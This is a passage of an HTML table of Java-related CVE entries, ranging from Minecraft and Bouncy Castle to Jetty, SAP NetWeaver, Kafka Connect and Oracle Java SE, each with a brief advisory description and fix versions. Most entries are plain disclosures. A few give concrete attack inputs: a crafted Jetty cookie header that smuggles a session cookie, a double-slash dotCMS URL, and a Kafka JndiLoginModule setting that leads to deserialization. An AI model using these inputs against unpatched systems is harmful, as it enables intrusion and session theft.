		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-33245">CVE-2023-33245</a></td>
		<td valign="top">Minecraft through 1.19 and 1.20 pre-releases before 7 (Java) allow arbitrary file overwrite, and possibly code execution, via crafted world data that contains a symlink.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-33202">CVE-2023-33202</a></td>
		<td valign="top">Bouncy Castle for Java before 1.73 contains a potential Denial of Service (DoS) issue within the Bouncy Castle org.bouncycastle.openssl.PEMParser class. This class parses OpenSSL PEM encoded streams containing X.509 certificates, PKCS8 encoded keys, and PKCS7 objects. Parsing a file that has crafted ASN.1 data through the PEMParser causes an OutOfMemoryError, which can enable a denial of service attack. (For users of the FIPS Java API: BC-FJA 1.0.2.3 and earlier are affected; BC-FJA 1.0.2.4 is fixed.)

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-33201">CVE-2023-33201</a></td>
		<td valign="top">Bouncy Castle For Java before 1.74 is affected by an LDAP injection vulnerability. The vulnerability only affects applications that use an LDAP CertStore from Bouncy Castle to validate X.509 certificates. During the certificate validation process, Bouncy Castle inserts the certificate's Subject Name into an LDAP search filter without any escaping, which leads to an LDAP injection vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-32787">CVE-2023-32787</a></td>
		<td valign="top">The OPC UA Legacy Java Stack before 6f176f2 enables an attacker to block OPC UA server applications via uncontrolled resource consumption so that they can no longer serve client applications.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-32697">CVE-2023-32697</a></td>
		<td valign="top">SQLite JDBC is a library for accessing and creating SQLite database files in Java. Sqlite-jdbc addresses a remote code execution vulnerability via JDBC URL. This issue impacting versions 3.6.14.1 through 3.41.2.1 and has been fixed in version 3.41.2.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-32217">CVE-2023-32217</a></td>
		<td valign="top">IdentityIQ 8.3 and all 8.3 patch levels prior to 8.3p3, IdentityIQ 8.2 and all 8.2 patch levels prior to 8.2p6, IdentityIQ 8.1 and all 8.1 patch levels prior to 8.1p7, IdentityIQ 8.0 and all 8.0 patch levels prior to 8.0p6 allow an authenticated user to invoke a Java constructor with no arguments or a Java constructor with a single Map argument in any Java class available in the IdentityIQ application classpath.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-31405">CVE-2023-31405</a></td>
		<td valign="top">SAP NetWeaver AS for Java - versions ENGINEAPI 7.50, SERVERCORE 7.50, J2EE-APPS 7.50, allows an unauthenticated attacker to craft a request over the network which can result in unwarranted modifications to a system log without user interaction. There is no ability to view any information or any effect on availability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-30744">CVE-2023-30744</a></td>
		<td valign="top">In SAP AS NetWeaver JAVA - versions SERVERCORE 7.50, J2EE-FRMW 7.50, CORE-TOOLS 7.50, an unauthenticated attacker can attach to an open interface and make use of an open naming and directory API to instantiate an object which has methods which can be called without further authorization and authentication. A subsequent call to one of these methods can read or change the state of existing services without any effect on availability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-30535">CVE-2023-30535</a></td>
		<td valign="top">Snowflake JDBC provides a JDBC type 4 driver that supports core functionality, allowing Java program to connect to Snowflake. Users of the Snowflake JDBC driver were vulnerable to a command injection vulnerability. An attacker could set up a malicious, publicly accessible server which responds to the SSO URL with an attack payload. If the attacker then tricked a user into visiting the maliciously crafted connection URL, the user&amp;#8217;s local machine would render the malicious payload, leading to a remote code execution. The vulnerability was patched on March 17, 2023 as part of Snowflake JDBC driver Version 3.13.29. All users should immediately upgrade the Snowflake JDBC driver to the latest version: 3.13.29.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-30441">CVE-2023-30441</a></td>
		<td valign="top">IBM Runtime Environment, Java Technology Edition IBMJCEPlus and JSSE 8.0.7.0 through 8.0.7.11 components could expose sensitive information using a combination of flaws and configurations. IBM X-Force ID: 253188.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-3042">CVE-2023-3042</a></td>
		<td valign="top">In dotCMS, versions mentioned, a flaw in the NormalizationFilter does not strip double slashes (//) from URLs, potentially enabling bypasses for XSS and access controls. An example affected URL is https://demo.dotcms.com//html/portlet/ext/files/edit_text_inc.jsp https://demo.dotcms.com//html/portlet/ext/files/edit_text_inc.jsp , which should return a 404 response but didn't. The oversight in the default invalid URL character list can be viewed at the provided GitHub link https://github.com/dotCMS/core/blob/master/dotCMS/src/main/java/com/dotcms/filters/NormalizationFilter.java#L37 . To mitigate, users can block URLs with double slashes at firewalls or utilize dotCMS config variables. Specifically, they can use the DOT_URI_NORMALIZATION_FORBIDDEN_STRINGS environmental variable to add // to the list of invalid strings. Additionally, the DOT_URI_NORMALIZATION_FORBIDDEN_REGEX variable offers more detailed control, for instance, to block //html.* URLs. Fix Version:23.06+, LTS 22.03.7+, LTS 23.01.4+

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-2976">CVE-2023-2976</a></td>
		<td valign="top">Use of Java's default temporary directory for file creation in `FileBackedOutputStream` in Google Guava versions 1.0 to 31.1 on Unix systems and Android Ice Cream Sandwich allows other users and apps on the machine with access to the default Java temporary directory to be able to access the files created by the class. Even though the security vulnerability is fixed in version 32.0.0, we recommend using version 32.0.1 as version 32.0.0 breaks some functionality under Windows.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-29637">CVE-2023-29637</a></td>
		<td valign="top">Cross Site Scripting (XSS) vulnerability in Qbian61 forum-java, allows attackers to inject arbitrary web script or HTML via editing the article content in the "article editor" page.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-29635">CVE-2023-29635</a></td>
		<td valign="top">File upload vulnerability in Antabot White-Jotter v0.2.2, allows remote attackers to execute malicious code via the file parameter to function coversUpload.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-29412">CVE-2023-29412</a></td>
		<td valign="top">CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability exists that could cause remote code execution when manipulating internal methods through Java RMI interface.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-29411">CVE-2023-29411</a></td>
		<td valign="top">A CWE-306: Missing Authentication for Critical Function vulnerability exists that could allow changes to administrative credentials, leading to potential remote code execution without requiring prior authentication on the Java RMI interface.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-29051">CVE-2023-29051</a></td>
		<td valign="top">User-defined OXMF templates could be used to access a limited part of the internal OX App Suite Java API. The existing switch to disable the feature by default was not effective in this case. Unauthorized users could discover and modify application state, including objects related to other users and contexts. We now make sure that the switch to disable user-generated templates by default works as intended and will remove the feature in future generations of the product. No publicly available exploits are known.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-28867">CVE-2023-28867</a></td>
		<td valign="top">In GraphQL Java (aka graphql-java) before 20.1, an attacker can send a crafted GraphQL query that causes stack consumption. The fixed versions are 20.1, 19.4, 18.4, 17.5, and 0.0.0-2023-03-20T01-49-44-80e3135.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-28725">CVE-2023-28725</a></td>
		<td valign="top">General Bytes Crypto Application Server (CAS) 20230120, as distributed with General Bytes BATM devices, allows remote attackers to execute arbitrary Java code by uploading a Java application to the /batm/app/admin/standalone/deployments directory, aka BATM-4780, as exploited in the wild in March 2023. This is fixed in 20221118.48 and 20230120.44.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-28500">CVE-2023-28500</a></td>
		<td valign="top">** UNSUPPORTED WHEN ASSIGNED ** A Java insecure deserialization vulnerability in Adobe LiveCycle ES4 version 11.0 and earlier allows unauthenticated remote attackers to gain operating system code execution by submitting specially crafted Java serialized objects to a specific URL. Adobe LiveCycle ES4 version 11.0.1 and later may be vulnerable if the application is installed with Java environment 7u21 and earlier. Exploitation of the vulnerability depends on two factors: insecure deserialization methods used in the Adobe LiveCycle application, and the use of Java environments 7u21 and earlier. The code execution is performed in the context of the account that is running the Adobe LiveCycle application. If the account is privileged, exploitation provides privileged access to the operating system. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-28462">CVE-2023-28462</a></td>
		<td valign="top">A JNDI rebind operation in the default ORB listener in Payara Server 4.1.2.191 (Enterprise), 5.20.0 and newer (Enterprise), and 5.2020.1 and newer (Community), when Java 1.8u181 and earlier is used, allows remote attackers to load malicious code on the server once a JNDI directory scan is performed.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-27268">CVE-2023-27268</a></td>
		<td valign="top">SAP NetWeaver AS Java (Object Analyzing Service) - version 7.50, does not perform necessary authorization checks, allowing an unauthenticated attacker to attach to an open interface and make use of an open naming and directory API to access a service which will enable them to access but not modify server settings and data with no effect on availability., resulting in escalation of privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-26919">CVE-2023-26919</a></td>
		<td valign="top">delight-nashorn-sandbox 0.2.4 and 0.2.5 is vulnerable to sandbox escape. When allowExitFunctions is set to false, the loadWithNewGlobal function can be used to invoke the exit and quit methods to exit the Java process.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-26460">CVE-2023-26460</a></td>
		<td valign="top">Cache Management Service in SAP NetWeaver Application Server for Java - version 7.50, does not perform any authentication checks for functionalities that require user identity

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-26458">CVE-2023-26458</a></td>
		<td valign="top">An information disclosure vulnerability exists in SAP Landscape Management - version 3.0, enterprise edition. It allows an authenticated SAP Landscape Management user to obtain privileged access to other systems making those other systems vulnerable to information disclosure and modification.The disclosed information is for Diagnostics Agent Connection via Java SCS Message Server of an SAP Solution Manager system and can only be accessed by authenticated SAP Landscape Management users, but they can escalate their privileges to the SAP Solution Manager system.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-26436">CVE-2023-26436</a></td>
		<td valign="top">Attackers with access to the "documentconverterws" API were able to inject serialized Java objects, that were not properly checked during deserialization. Access to this API endpoint is restricted to local networks by default. Arbitrary code could be injected that is being executed when processing the request. A check has been introduced to restrict processing of legal and expected classes for this API. We now log a warning in case there are attempts to inject illegal classes. No publicly available exploits are known.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-26049">CVE-2023-26049</a></td>
		<td valign="top">Jetty is a java based web server and servlet engine. Nonstandard cookie parsing in Jetty may allow an attacker to smuggle cookies within other cookies, or otherwise perform unintended behavior by tampering with the cookie parsing mechanism. If Jetty sees a cookie VALUE that starts with `"` (double quote), it will continue to read the cookie string until it sees a closing quote -- even if a semicolon is encountered. So, a cookie header such as: `DISPLAY_LANGUAGE="b; JSESSIONID=1337; c=d"` will be parsed as one cookie, with the name DISPLAY_LANGUAGE and a value of b; JSESSIONID=1337; c=d instead of 3 separate cookies. This has security implications because if, say, JSESSIONID is an HttpOnly cookie, and the DISPLAY_LANGUAGE cookie value is rendered on the page, an attacker can smuggle the JSESSIONID cookie into the DISPLAY_LANGUAGE cookie and thereby exfiltrate it. This is significant when an intermediary is enacting some policy based on cookies, so a smuggled cookie can bypass that policy yet still be seen by the Jetty server or its logging system. This issue has been addressed in versions 9.4.51, 10.0.14, 11.0.14, and 12.0.0.beta0 and users are advised to upgrade. There are no known workarounds for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-26048">CVE-2023-26048</a></td>
		<td valign="top">Jetty is a java based web server and servlet engine. In affected versions servlets with multipart support (e.g. annotated with `@MultipartConfig`) that call `HttpServletRequest.getParameter()` or `HttpServletRequest.getParts()` may cause `OutOfMemoryError` when the client sends a multipart request with a part that has a name but no filename and very large content. This happens even with the default settings of `fileSizeThreshold=0` which should stream the whole part content to disk. An attacker client may send a large multipart request and cause the server to throw `OutOfMemoryError`. However, the server may be able to recover after the `OutOfMemoryError` and continue its service -- although it may take some time. This issue has been patched in versions 9.4.51, 10.0.14, and 11.0.14. Users are advised to upgrade. Users unable to upgrade may set the multipart parameter `maxRequestSize` which must be set to a non-negative value, so the whole multipart content is limited (although still read into memory).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-25722">CVE-2023-25722</a></td>
		<td valign="top">A credential-leak issue was discovered in related Veracode products before 2023-03-27. Veracode Scan Jenkins Plugin before 23.3.19.0, when configured for remote agent jobs, invokes the Veracode Java API Wrapper in a manner that allows local users (with OS-level access of the Jenkins remote) to discover Veracode API credentials by listing the process and its arguments. Veracode Scan Jenkins Plugin before 23.3.19.0, when configured for remote agent jobs and when the "Connect using proxy" option is enabled and configured with proxy credentials, allows local users of the Jenkins remote to discover proxy credentials by listing the process and its arguments. Veracode Azure DevOps Extension before 3.20.0 invokes the Veracode Java API Wrapper in a manner that allows local users (with OS-level access to the Azure DevOps Services cloud infrastructure or Azure DevOps Server) to discover Veracode API credentials by listing the process and its arguments. Veracode Azure DevOps Extension before 3.20.0, when configured with proxy credentials, allows users (with shell access to the Azure DevOps Services cloud infrastructure or Azure DevOps Server) to discover proxy credentials by listing the process and its arguments.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-25617">CVE-2023-25617</a></td>
		<td valign="top">SAP Business Object (Adaptive Job Server) - versions 420, 430, allows remote execution of arbitrary commands on Unix, when program objects execution is enabled, to authenticated users with scheduling rights, using the BI Launchpad, Central Management Console or a custom application based on the public java SDK. Programs could impact the confidentiality, integrity and availability of the system.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-25561">CVE-2023-25561</a></td>
		<td valign="top">DataHub is an open-source metadata platform. In the event a system is using Java Authentication and Authorization Service (JAAS) authentication and that system is given a configuration which contains an error, the authentication for the system will fail open and allow an attacker to login using any username and password. The reason for this is that while an error is thrown in the `authenticateJaasUser` method it is swallowed without propagating the error. As a result of this issue unauthenticated users may gain access to the system. Users are advised to upgrade. There are no known workarounds for this issue. This vulnerability was discovered and reported by the GitHub Security lab and is tracked as GHSL-2022-081.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-25558">CVE-2023-25558</a></td>
		<td valign="top">DataHub is an open-source metadata platform. When the DataHub frontend is configured to authenticate via SSO, it will leverage the pac4j library. The processing of the `id_token` is done in an unsafe manner which is not properly accounted for by the DataHub frontend. Specifically, if any of the id_token claims value start with the {#sb64} prefix, pac4j considers the value to be a serialized Java object and will deserialize it. This issue may lead to Remote Code Execution (RCE) in the worst case. Although a `RestrictedObjectInputStream` is in place, that puts some restriction on what classes can be deserialized, it still allows a broad range of java packages and potentially exploitable with different gadget chains. Users are advised to upgrade. There are no known workarounds. This vulnerability was discovered and reported by the GitHub Security lab and is tracked as GHSL-2022-086.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-25194">CVE-2023-25194</a></td>
		<td valign="top">A possible security vulnerability has been identified in Apache Kafka Connect API. This requires access to a Kafka Connect worker, and the ability to create/modify connectors on it with an arbitrary Kafka client SASL JAAS config and a SASL-based security protocol, which has been possible on Kafka Connect clusters since Apache Kafka Connect 2.3.0. When configuring the connector via the Kafka Connect REST API, an authenticated operator can set the `sasl.jaas.config` property for any of the connector's Kafka clients to "com.sun.security.auth.module.JndiLoginModule", which can be done via the `producer.override.sasl.jaas.config`, `consumer.override.sasl.jaas.config`, or `admin.override.sasl.jaas.config` properties. This will allow the server to connect to the attacker's LDAP server and deserialize the LDAP response, which the attacker can use to execute java deserialization gadget chains on the Kafka connect server. Attacker can cause unrestricted deserialization of untrusted data (or) RCE vulnerability when there are gadgets in the classpath. Since Apache Kafka 3.0.0, users are allowed to specify these properties in connector configurations for Kafka Connect clusters running with out-of-the-box configurations. Before Apache Kafka 3.0.0, users may not specify these properties unless the Kafka Connect cluster has been reconfigured with a connector client override policy that permits them. Since Apache Kafka 3.4.0, we have added a system property ("-Dorg.apache.kafka.disallowed.login.modules") to disable the problematic login modules usage in SASL JAAS configuration. Also by default "com.sun.security.auth.module.JndiLoginModule" is disabled in Apache Kafka Connect 3.4.0. We advise the Kafka Connect users to validate connector configurations and only allow trusted JNDI configurations. Also examine connector dependencies for vulnerable versions and either upgrade their connectors, upgrading that specific dependency, or removing the connectors as options for remediation. Finally, in addition to leveraging the "org.apache.kafka.disallowed.login.modules" system property, Kafka Connect users can also implement their own connector client config override policy, which can be used to control which Kafka client properties can be overridden directly in a connector config and which cannot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-25158">CVE-2023-25158</a></td>
		<td valign="top">GeoTools is an open source Java library that provides tools for geospatial data. GeoTools includes support for OGC Filter expression language parsing, encoding and execution against a range of datastore. SQL Injection Vulnerabilities have been found when executing OGC Filters with JDBCDataStore implementations. Users are advised to upgrade to either version 27.4 or to 28.2 to resolve this issue. Users unable to upgrade may disable `encode functions` for PostGIS DataStores or enable `prepared statements` for JDBCDataStores as a partial mitigation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-25157">CVE-2023-25157</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. GeoServer includes support for the OGC Filter expression language and the OGC Common Query Language (CQL) as part of the Web Feature Service (WFS) and Web Map Service (WMS) protocols. CQL is also supported through the Web Coverage Service (WCS) protocol for ImageMosaic coverages. Users are advised to upgrade to either version 2.21.4, or version 2.22.2 to resolve this issue. Users unable to upgrade should disable the PostGIS Datastore *encode functions* setting to mitigate ``strEndsWith``, ``strStartsWith`` and ``PropertyIsLike `` misuse and enable the PostGIS DataStore *preparedStatements* setting to mitigate the ``FeatureId`` misuse.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-24971">CVE-2023-24971</a></td>
		<td valign="top">IBM B2B Advanced Communications 1.0.0.0 and IBM Multi-Enterprise Integration Gateway 1.0.0.1 could allow a user to cause a denial of service due to the deserializing of untrusted serialized Java objects. IBM X-Force ID: 246976.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-24815">CVE-2023-24815</a></td>
		<td valign="top">Vert.x-Web is a set of building blocks for building web applications in the java programming language. When running vertx web applications that serve files using `StaticHandler` on Windows Operating Systems and Windows File Systems, if the mount point is a wildcard (`*`) then an attacker can exfiltrate any class path resource. When computing the relative path to locate the resource, in case of wildcards, the code: `return "/" + rest;` from `Utils.java` returns the user input (without validation) as the segment to lookup. Even though checks are performed to avoid escaping the sandbox, given that the input was not sanitized `\` are not properly handled and an attacker can build a path that is valid within the classpath. This issue only affects users deploying in windows environments and upgrading is the advised remediation path. There are no known workarounds for this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-24621">CVE-2023-24621</a></td>
		<td valign="top">An issue was discovered in Esoteric YamlBeans through 1.15. It allows untrusted deserialisation to Java classes by default, where the data and class are controlled by the author of the YAML document being processed.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-24620">CVE-2023-24620</a></td>
		<td valign="top">An issue was discovered in Esoteric YamlBeans through 1.15. A crafted YAML document is able perform am XML Entity Expansion attack against YamlBeans YamlReader. By exploiting the Anchor feature in YAML, it is possible to generate a small YAML document that, when read, is expanded to a large size, causing CPU and memory consumption, such as a Java Out-of-Memory exception.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-24527">CVE-2023-24527</a></td>
		<td valign="top">SAP NetWeaver AS Java for Deploy Service - version 7.5, does not perform any access control checks for functionalities that require user identity enabling an unauthenticated attacker to attach to an open interface and make use of an open naming and directory API to access a service which will enable them to access but not modify server settings and data with no effect on availability and integrity.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-24526">CVE-2023-24526</a></td>
		<td valign="top">SAP NetWeaver Application Server Java for Classload Service - version 7.50, does not perform any authentication checks for functionalities that require user identity, resulting in escalation of privileges. This failure has a low impact on confidentiality of the data such that an unassigned user can read non-sensitive server data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-23857">CVE-2023-23857</a></td>
		<td valign="top">Due to missing authentication check, SAP NetWeaver AS for Java - version 7.50, allows an unauthenticated attacker to attach to an open interface and make use of an open naming and directory API to access services which can be used to perform unauthorized operations affecting users and services across systems. On a successful exploitation, the attacker can read and modify some sensitive information but can also be used to lock up any element or operation of the system making that it unresponsive or unavailable.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22644">CVE-2023-22644</a></td>
		<td valign="top">An Innsertion of Sensitive Information into Log File vulnerability in SUSE SUSE Manager Server Module 4.2 spacewalk-java, SUSE SUSE Manager Server Module 4.3 spacewalk-java causes sensitive information to be logged. This issue affects SUSE Manager Server Module 4.2: before 4.2.50-150300.3.66.5; SUSE Manager Server Module 4.3: before 4.3.58-150400.3.46.4.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22516">CVE-2023-22516</a></td>
		<td valign="top">This High severity RCE (Remote Code Execution) vulnerability was introduced in versions 8.1.0, 8.2.0, 9.0.0, 9.1.0, 9.2.0, and 9.3.0 of Bamboo Data Center and Server. This RCE (Remote Code Execution) vulnerability, with a CVSS Score of 8.5, allows an authenticated attacker to execute arbitrary code which has high impact to confidentiality, high impact to integrity, high impact to availability, and requires no user interaction. Atlassian recommends that Bamboo Data Center and Server customers upgrade to latest version, if you are unable to do so, upgrade your instance to one of the specified supported fixed versions: Bamboo Data Center and Server 9.2: Upgrade to a release greater than or equal to 9.2.7. JDK 1.8u121+ should be used in case Java 8 used to run Bamboo Data Center and Server. See Bamboo 9.2 Upgrade notes (https://confluence.atlassian.com/bambooreleases/bamboo-9-2-upgrade-notes-1207179212.html) Bamboo Data Center and Server 9.3: Upgrade to a release greater than or equal to 9.3.4 See the release notes ([https://confluence.atlassian.com/bambooreleases/bamboo-release-notes-1189793869.html]). You can download the latest version of Bamboo Data Center and Server from the download center ([https://www.atlassian.com/software/bamboo/download-archives]). This vulnerability was discovered by a private user and reported via our Bug Bounty program

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22096">CVE-2023-22096</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 19.3-19.20 and 21.3-21.11. Easily exploitable vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via Oracle Net to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java VM accessible data. CVSS 3.1 Base Score 4.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22091">CVE-2023-22091</a></td>
		<td valign="top">Vulnerability in the Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Compiler). Supported versions that are affected are Oracle GraalVM for JDK: 17.0.8, 21; Oracle GraalVM Enterprise Edition: 20.3.11, 21.3.7 and 22.3.3. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as unauthorized read access to a subset of Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22081">CVE-2023-22081</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Oracle Java SE: 8u381, 8u381-perf, 11.0.20, 17.0.8, 21; Oracle GraalVM for JDK: 17.0.8, 21; Oracle GraalVM Enterprise Edition: 20.3.11, 21.3.7 and 22.3.3. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22067">CVE-2023-22067</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: CORBA). Supported versions that are affected are Oracle Java SE: 8u381, 8u381-perf; Oracle GraalVM Enterprise Edition: 20.3.11 and 21.3.7. Easily exploitable vulnerability allows unauthenticated attacker with network access via CORBA to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22052">CVE-2023-22052</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 19.3-19.19 and 21.3-21.10. Difficult to exploit vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via multiple protocols to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java VM accessible data. CVSS 3.1 Base Score 3.1 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22051">CVE-2023-22051</a></td>
		<td valign="top">Vulnerability in the Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK product of Oracle Java SE (component: GraalVM Compiler). Supported versions that are affected are Oracle GraalVM Enterprise Edition: 21.3.6, 22.3.2; Oracle GraalVM for JDK: 17.0.7 and 20.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK accessible data. CVSS 3.1 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2023-22049">CVE-2023-22049</a></td>
